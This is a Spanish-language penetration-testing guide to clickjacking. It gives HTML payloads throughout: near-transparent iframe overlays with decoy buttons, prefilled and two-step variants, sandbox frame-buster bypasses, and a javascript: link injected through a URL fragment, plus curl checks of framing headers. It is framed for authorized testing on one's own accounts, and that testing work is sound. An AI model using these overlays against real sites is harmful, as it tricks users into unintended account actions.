# 🗡️ Clickjacking: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 📚 Banco ampliado de payloads

[Abrir el catálogo por técnica y los diccionarios de PayloadsAllTheThings](Catalogo_PATT.md). Los bloques de esta guía explican las pruebas iniciales; el catálogo reúne variantes adicionales por motor, parser y contexto.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Comprobar framing de páginas sensibles

```html
<iframe src="https://{ORIGEN}/account/settings" width="1000" height="700"></iframe>
<iframe src="https://{ORIGEN}/account/consent" width="1000" height="700"></iframe>
```

**Cuándo usarlo:** Elegir la ruta real con una acción reversible. Que la página cargue en iframe es una precondición; confirmar también que se puede accionar.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/clickjacking).


## 🧭 Payloads por contexto

### Superposición y clic único

```html
<button style="position:absolute;left:{X}px;top:{Y}px">Ver prueba</button><iframe style="position:absolute;left:0;top:0;width:1000px;height:700px;opacity:.05;z-index:2" src="https://{ORIGEN}/account/settings"></iframe>
<button style="position:absolute;left:{X}px;top:{Y}px">Continuar</button><iframe style="position:absolute;left:0;top:0;width:1000px;height:700px;opacity:.2;z-index:2" src="https://{ORIGEN}/account/consent"></iframe>
```

**Cuándo usarlo:** Son variantes alternativas. Medir coordenadas y viewport en cuenta propia; algunos navegadores limitan frames casi transparentes.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/clickjacking).


### Formulario prellenado y dos pasos

```html
<iframe src="https://{ORIGEN}/account/settings?displayName=canary-123" width="1000" height="700"></iframe>
<button style="position:absolute;left:{X1}px;top:{Y1}px">Paso 1</button><button style="position:absolute;left:{X2}px;top:{Y2}px">Paso 2</button><iframe style="position:absolute;left:0;top:0;opacity:.05;z-index:2;width:1000px;height:700px" src="https://{ORIGEN}/account/settings"></iframe>
```

**Cuándo usarlo:** La primera exige que el GET rellene un campo; la segunda requiere dos acciones medidas por separado. Restaurar cambios de la cuenta de prueba.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/clickjacking).


## 🔥 Payloads avanzados

### Frame buster y sandbox

```html
<iframe src="https://{ORIGEN}/account/settings" sandbox="allow-forms" width="1000" height="700"></iframe>
<iframe src="https://{ORIGEN}/account/settings" sandbox="allow-scripts" width="1000" height="700"></iframe>
```

**Cuándo usarlo:** La primera permite formularios pero no scripts; la segunda, scripts pero no formularios. Ninguna elude frame-ancestors o X-Frame-Options válidos.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/clickjacking).


### Política efectiva en la respuesta

```bash
curl -si "https://{ORIGEN}/account/settings" | rg -i 'content-security-policy|x-frame-options'
curl -si "https://{ORIGEN}/account/consent" | rg -i 'content-security-policy|x-frame-options'
```

**Cuándo usarlo:** Comparar la ruta exacta y el navegador. Un header ausente, o un onload de iframe, no basta para demostrar la acción.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/clickjacking).


## 🔬 Pruebas guiadas por escenario

### 1. Framing básico

**Objetivo:** Comprobar si una página de acción sensible permite iframe desde origen de prueba.

```html
<iframe src="https://{ORIGEN}/account/settings" width="1000" height="700"></iframe>
```

**Interpretación:** Framing permitido es precondición; demostrar además una acción sensible reversible.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/clickjacking).

### 2. Superposición de un clic

**Objetivo:** Alinear un botón señuelo y una acción real en laboratorio.

```html
<style>iframe{position:absolute;top:0;left:0;width:1000px;height:700px;opacity:.05;z-index:2}button{position:absolute;top:{Y}px;left:{X}px;z-index:1}</style><button>Ver prueba</button><iframe src="https://{ORIGEN}/account/settings"></iframe>
```

**Interpretación:** Sustituir coordenadas por medidas de la vista propia; un clic debe accionar solo el control autorizado.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/clickjacking).

### 3. Formulario prellenado

**Objetivo:** Probar si la URL puede preparar valores antes del clic.

```html
<iframe src="https://{ORIGEN}/account/settings?displayName=prueba-123" width="1000" height="700"></iframe>
```

**Interpretación:** La pre-carga y el clic final deben verificarse; un query ignorado no crea impacto.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/clickjacking).

### 4. Dos pasos

**Objetivo:** Alinear dos posiciones cuando el flujo requiere confirmación adicional.

```html
<button style="position:absolute;left:{X1}px;top:{Y1}px">Paso 1</button><button style="position:absolute;left:{X2}px;top:{Y2}px">Paso 2</button><iframe style="position:absolute;left:0;top:0;opacity:.05;z-index:2" src="https://{ORIGEN}/account/settings"></iframe>
```

**Interpretación:** Ambos clics se reproducen solo en la cuenta de prueba; medir desplazamientos tras el primero.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/clickjacking).

### 5. Cabeceras de la ruta

**Objetivo:** Verificar políticas efectivas en la página embebida.

```bash
curl -sSI "https://{ORIGEN}/account/settings" | rg -i 'content-security-policy|x-frame-options'
```

**Interpretación:** La ausencia de headers no es hallazgo sin framing y acción; la respuesta HEAD puede diferir de GET.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/clickjacking).

### 6. Protección por CSP en iframe

**Objetivo:** Comparar desde un origen permitido y uno externo controlado.

```html
<iframe src="https://{ORIGEN}/account/settings" onload="console.log('frame cargado')"></iframe>
```

**Interpretación:** onload por sí solo no prueba que se haya renderizado el documento; comprobar consola del navegador por frame-ancestors.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/clickjacking).

### 7. Frame buster bajo sandbox

**Objetivo:** Probar si un frame buster de JavaScript falla al impedir la navegación superior.

```html
<iframe src="https://{ORIGEN}/account/settings" sandbox="allow-forms" width="1000" height="700"></iframe>
```

**Interpretación:** Solo aplica si la ruta es frameable y la acción funciona con scripts deshabilitados; comprobar el clic en cuenta propia.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/clickjacking).

### 8. Click sobre enlace DOM

**Objetivo:** Combinar una página frameable con un sink DOM que crea un enlace controlado.

```html
<button style="position:absolute;left:{X}px;top:{Y}px">Abrir prueba</button><iframe style="position:absolute;left:0;top:0;opacity:.05;z-index:2;width:1000px;height:700px" src="https://{ORIGEN}/page#%3Ca%20href%3D%22javascript%3Adocument.body.dataset.xss%3D123%22%3Eabrir%3C%2Fa%3E"></iframe>
```

**Interpretación:** Solo aplica si la página convierte el fragmento en un enlace HTML clicable; medir su posición y confirmar el efecto en cuenta propia.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/clickjacking).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
